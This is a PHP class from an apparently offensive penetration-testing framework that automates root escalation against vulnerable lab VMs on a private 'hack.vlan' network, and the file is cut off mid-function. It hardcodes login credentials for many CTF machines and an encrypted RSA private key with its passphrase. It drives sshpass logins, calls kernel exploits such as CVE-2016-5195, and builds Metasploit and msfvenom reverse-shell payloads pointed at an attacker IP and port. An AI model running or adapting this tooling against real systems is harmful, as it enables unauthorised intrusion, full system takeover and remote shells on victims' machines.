<?php
class poc4lan extends poc4web {
    
    
    public function __construct() {
        parent::__construct();
        
    }
   
    
    
    public function poc4lan4crypto(){
        // ######### CRYPTOGRAPHY #############
        $this->poc4crypto();
        // ###########################
        
        ssl ();
        https ();
        
        // openssl s_client -host google.com -port 443 -prexit -showcerts
        
        // ssTitre("Creates a 2048-bit RSA key pair and generates a Certificate Signing Request for it");
        // requette("openssl req -new -nodes -newkey rsa:2048 -keyout newprivate.key -out request.csr");
        $this->pause();
        // ###########################
    }
    
    
    
    
    public function poc4root8users(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $login = "user" ;
        $pass = "password";
        
        $ip = "10.60.10.135"; // Cyberry
        $port = "22";
        $protocol = "T";
        
        $login = "root" ;
        $pass = "chewbacabemerry";
        $login = "mary" ;
        $pass = "bakeoff";
        $login = "nick" ;
        $pass = "custodio";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
        $this->start(__FUNCTION__, $titre);
        $this->gtitre(__FUNCTION__);
        
        $eth = trim($eth);
        $domain = trim($domain);
        $ip = trim($ip);
        $port = trim($port);
        $protocol = trim($protocol);
        $login = trim($login);
        $pass = trim($pass);
        $titre = trim($titre);
        $fonction2exec = trim($fonction2exec);
        $vm = trim($vm);
        $this->titre(__FUNCTION__);
        
        
        //$victime = new vm($vm);
        //$victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
        
        $flag_poc = FALSE;
        //$flag_poc = "no";
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        var_dump($test->flag_poc);
        $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
        
        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%' ";
        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
        
        if (is_resource($stream)){
            $templateB64_id = base64_encode($template_id);
            $templateB64_cmd = base64_encode($template_cmd);
            $templateB64_shell = base64_encode($template_shell);
            
            $data = "id";
            $rst_id = $test->stream4result($stream, $data, 10);
            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $test->parse4id($rst_id);
            $id8b64 = base64_encode($id8str);
            $this->article("CREATE Template ID", $template_id);
            $this->article("CREATE Template CMD", $template_cmd);
            $this->article("CREATE Template SHELL", $template_shell);
            $test->pause();
            $query = "DELETE FROM LAN where id8port = '$test->port2id' ";
            $test->mysql_ressource->query($query);
                
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$pass);
            $obj_lan->poc($test->flag_poc);
            var_dump($obj_lan->flag_poc);
            $obj_lan->$fonction2exec();
            $obj_lan->lan2brief();
        }
    }
    
    public function poc4root8suid2elf(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.178"; // Five 1
        $port = "22";
        $protocol = "T";
        $login = "moss" ;
        $pass = 'Fire!Fire!';
        
        $titre = "";
        $fonction2exec = "lan4root";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8suid2find(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $login = "user" ;
        $pass = "password";
        
        $ip = "10.60.10.137"; // DC-1 OK 
        $port = "22";
        $protocol = "T";
        $login = "flag4" ;
        $pass = "orange";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    
    public function poc4root8users2sudoers8app2write8cp2etc_passwd(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.141"; // DC-2
        $port = "7744";
        $protocol = "T";
        $login = "jerry" ;
        $pass = "adipiscing";
        $login = "tom" ;
        $pass = "parturient";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    
    public function poc4root8users2sudoers8app2cmd2watch(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.177"; // rudra
        $port = "22";
        $protocol = "T";
        
        
        $login = "sunset";
        $pass = "cheer14";
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
 
    
    public function poc4root8suids8env2path(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.159"; // Silky-CTF
        $port = "22";
        $protocol = "T";
        $login = 'silky' ;
        $pass = 's1lKy#5';

        $titre = "";
        $fonction2exec = "suids";
        $suid = "/usr/bin/sky";
        $vm = "";
        $suid = "/usr/bin/sky";
        $suid_call = "whoami";
        $this->suids8env2path4add($suid,$suid_call);
        
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8users2sudoers8app2cmd2tcpdump(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.169"; //webdeveloper
        $port = "22";
        $protocol = "T";
        $login = "webdeveloper" ;
        $pass = 'MasterOfTheUniverse';
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8users2sudoers8app2cmd2strace(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.158"; // PumpkinRaising
        $port = "22";
        $protocol = "T";
        $login = "jack" ;
        $pass = "69507506099645486568";
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    

    
    public function poc4root8users2sudoers8app2cmd2all(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.160"; // W34kn3ss One
        $port = "22";
        $protocol = "T";
        $login = 'n30' ;
        $pass = 'dMASDNB!!#B!#!#33';
        
        $ip = "10.60.10.161"; // W1R3S
        $port = "22";
        $protocol = "T";
        $login = 'w1r3s' ;
        $pass = 'computer';
        
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
 


    public function poc4root8users2sudoers8app2cmd2ftp(){ // 
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.172"; // HA-InfinityStones
        $port = "22";
        $protocol = "T";
        $login = "morag" ;
        $pass = "yondu";
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8users2sudoers8app2cmd2wine(){ // revoir
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.170"; // Sunrise
        $port = "22";
        $protocol = "T";
        $login = "sunrise" ;
        $pass = 'thefutureissobrightigottawearshades';
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8users2sudoers8app2cmd2php(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.168"; // me and my girlfriend
        $port = "22";
        $protocol = "T";
        $login = "alice" ;
        $pass = '4lic3';
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers8app2cmd2ed(){ // OK 
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';

        $ip = "10.60.10.176"; // sunset
        $port = "22";
        $protocol = "T";

        
        $login = "sunset";
        $pass = "cheer14";
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8users2sudoers8app2cmd2git(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.141"; // DC-2
        $port = "7744";
        $protocol = "T";
        $login = "jerry" ;
        $pass = "adipiscing";
        $login = "tom" ;
        $pass = "parturient";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8su(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.140"; // Matrix1
        $port = "22";
        $protocol = "T";
        $login = "guest" ;
        $pass = "k1ll0r7n";

        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8suid2vim(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // Basic Penetration Testing Two
        $port = "22";
        $protocol = "T";
        $login = "jan" ;
        $pass = "armando";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8keypriv(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // Basic Penetration Testing Two
        $port = "22";
        $protocol = "T";
        $login = "jan" ;
        $pass = "armando";
        
        
        $ip = "10.60.10.162"; // Moria 1.1 OK 
        $port = "22";
        $protocol = "T";
        $login = "Ori" ;
        $pass = "spanky";
        
        $titre = "";
        $fonction2exec = "misc2keys";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8suid2write2etc_sudoers(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // basic pentesting 2
        $port = "22";
        $protocol = "T";
        $login = "kay" ;
        $private_key_str = "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
            
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
-----END RSA PRIVATE KEY-----";
        $private_key_passwd = "beeswax";
        
        $hash_sha1 = sha1($private_key_str);
        
        
        $private_key_file = "/tmp/$hash_sha1.priv";
        $this->str2file($private_key_str, $private_key_file);
        $public_key_file = "/tmp/$hash_sha1.pub";
        
        //$private_key_file = "/tmp/$hash_sha1.priv.tmp";
        //$public_key_file = "$private_key_file.pub";
        
        
        
        $flag_poc = FALSE;
        $flag_poc = TRUE;
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        $test->key2gen4public("", 10, $private_key_file, $public_key_file, $private_key_passwd);
        
        
        $stream = $test->stream8ssh8key8public($test->ip, $test->port, $login, $public_key_file, $private_key_file, $private_key_passwd);
        
        $template_cmd = "ssh $login@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
        list($stream,$template_cmd) = $test->stream4check($stream,$template_cmd,$login,$pass);
        
        
        //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $login,$private_key_str, $private_key_file, $private_key_passwd);
        //$test->stream4root($stream);
        
        if (is_resource($stream)){
            //$test->openvas($ip);
            //var_dump($stream);echo get_resource_type($stream);$test->pause();
            //$test->yesAUTH($test->ip, $test->port, $test->protocol, $login, $pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
            $template_id = "%ID%";
            $templateB64_id = base64_encode($template_id);
            $templateB64_cmd = base64_encode($template_cmd);
            
            $data = "id";
            $rst_id = $test->stream4result($stream, $data, 10);
            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
            $id8b64 = base64_encode($id);
            $this->article("CREATE Template ID", $template_id);
            $this->article("CREATE Template BASE64 ID", $templateB64_id);
            $this->article("CREATE Template CMD", $template_cmd);
            $this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
            $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
            $templateB64_shell = base64_encode($template_shell);
            $this->article("CREATE Template SHELL", $template_shell);
            $this->article("CREATE Template BASE64 SHELL", $templateB64_shell);
            
            $pass = "";
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$pass);
            $obj_lan->poc($test->flag_poc);
            
            
            
            //$strings_etc_passwd = $obj_lan->lan2stream4result($data, $timeout);
            //$obj_lan->parse4etc_passwd($strings_etc_passwd);
            //$obj_lan->misc2keys();$this->pause();
            //$obj_lan->jobs();
            
            
            
            $suid_path = "/usr/bin/vim.basic";
            //$obj_lan->suids4one($suid_path);
            return $obj_lan->users2sudoers();
            
            
        }
        
        
    }
    
    
    
    public function poc4root8suid2lib(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $login = "user" ;
        $pass = "password";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8kernel_44298_CVE_2017_16995(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.147"; // fowsniff-1
        $port = "22";
        $protocol = "T";
        $login = "baksteen" ;
        $pass = "S1ck3nBluff+secureshell";
        

        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8app_41154_screen(){ //
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8app_38362_sudoedit(){ //
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = "10.60.10.151"; // PumpkinGarden
        $port = "3535";
        $protocol = "T";
        $login = 'scarecrow' ;
        $pass = '5Qn@$y';
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8exploit8kernel_test(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.153"; // DeRKnStiNK
        $port = "22";
        $protocol = "T";
        $login = "mrderp" ;
        $pass = "derpderpderpderpderpderpderp";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8exploit8kernel_39166_CVE_2015_8660(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.138"; // analoguepond
        $port = "22";
        $protocol = "T";
        $login = "eric" ;
        $pass = "therisingsun";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8exploit8kernel_40616_CVE_2016_5195(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.152"; // Lampiao
        $port = "22";
        $protocol = "T";
        $login = "tiago" ;
        $pass = "Virgulino";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    public function poc4root8exploit8kernel_40847_CVE_2016_5195(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
                
        $ip = "10.60.10.152"; // Lampio
        $port = "1898";
        $protocol = "T";
        $web = "http://$ip:$port/";
        $obj_web = new WEB($eth, $domain, $web);
        $obj_web->web4pentest8cms();
    }
    
    public function poc4root8exploit8kernel_37292_CVE_2015_1328(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.147"; // OK typhoon 1.02 exploit_37292
        $port = "22";
        $protocol = "T";
        $login = "typhoon" ;
        $pass = "789456123";
        
        
        $ip = "10.60.10.148"; // OK Super Mario exploit_37292
        $port = "22";
        $protocol = "T";
        $login = "luigi" ;
        $pass = "luigi1";
        
        $ip = "10.60.10.149"; // OK SecOS 1 exploit_37292
        $port = "22";
        $protocol = "T";
        $login = "spiderman" ;
        $pass = "CrazyPassword!";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8exploits(){
        $this->ssTitre(__FUNCTION__);
        $eth = "vmnet6";
        $domain = "hack.vlan";
        $ip = "10.60.10.129";
        $port = 21 ;
        $protocol = 'T';
        $attacker_ip = "10.60.10.1";
        $attacker_port = "8888";
        $type = "server";
        $timeout = 60 ;
        $flag_poc = TRUE ;
        
        $obj_service = new SERVICE($eth, $domain, $ip, $port, $protocol);
        $obj_service->poc($flag_poc);
        $obj_service->service2exploitdb();
        exit();
        $obj_service->pause();
        $exploit = "exploit/unix/ftp/vsftpd_234_backdoor";
        $info = $exploit;
        $payloads = $obj_service->service8msf8exploit2payloads($exploit);
        $payloads = array_filter($payloads);
        $obj_service->pause();
        foreach ($payloads as $payload){
            echo $obj_service->service8msf8exploit2payload2options($exploit, $payload);
            $obj_service->pause();
        }
        exit();
        $exploit_rc = "$obj_service->dir_tmp/"."$obj_service->eth.$obj_service->domain.$obj_service->ip.$obj_service->port.$obj_service->protocol.$obj_service->service_name.rc";
        $str2file =  "db_status\nuse $info\nset RHOSTS $obj_service->ip\nset RPORT $obj_service->port\nset payload linux/x86/shell_reverse_tcp\nset LHOST $attacker_ip\nset LPORT $attacker_port\nrun\nexit\n";
        $obj_service->str2file($str2file, $exploit_rc);
        $obj_service->service8msf($exploit_rc, $attacker_port, $info, $type, $timeout);
        exit();
        
        
        $obj_service->cmd("localhost", " msfcli exploit/unix/ftp/vsftpd_234_backdoor RHOST=$this->msf E");
        $obj_service->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  linux/x86/shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port --platform linux --arch x86 --encoder  x86/shikata_ga_nai  --iterations 10 --format elf ";
        $query = "msfvenom -p cmd/unix/reverse_python LHOST=$attacker_ip LPORT=$attacker_port --format raw ";
        
        $query = "echo \"db_status\nuse auxiliary/scanner/netbios/nbname\nset RHOSTS $this->ip\nset RPORT $this->port\nset THREADS 8\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        
        $this->pause();
        $query = " nmap -sC irc-find -Pn -vvv -p6667 $this->msf -n --reason -e $this->eth_lan";
        $this->requette($query);
        $this->pause();
        exploitdb("unreal linux 3.2.8.1");
        $this->cmd("localhost", " msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=$this->msf E");
        $this->pause();
        /*
         * exploitdb("postgresql");
         * cmd("localhost"," msfcli auxiliary/scanner/postgres/postgres_version RHOSTS=$this->msf E");
         * cmd("localhost"," msfcli exploit/linux/postgres/postgres_payload RHOST=$this->msf E");pause();
         */
        $this->ssTitre("distccd");
        // Daemon user
        exploitdb("distcc");
        $this->net("http://www.delafond.org/traducmanfr/man/man1/distccd.1.html");
        $this->pause();
        $this->cmd("localhost", " msfcli exploit/unix/misc/distcc_exec RHOST=$this->msf E");
        $this->pause();
        $this->ssTitre("JAVA RMI");
        exploitdb("rmi");
        $this->cmd("localhost", " msfcli exploit/multi/misc/java_rmi_server RHOST=$this->msf TARGET=2 E");
        $this->pause();
        exploitdb("openssh");
        $this->ssTitre("Domain");
        $this->requette("dig @$this->msf version.bind txt chaos +short");
        $this->pause();
    }
    
    
    
    
    
    
    public function poc4root8jobs(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        
        $login = "susan" ;
        $pass = "MySuperS3cretValue!";
        $login = "insecurity" ;
        $pass = "P@ssw0rd";
        $login = "root" ;
        $pass = "secret123";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
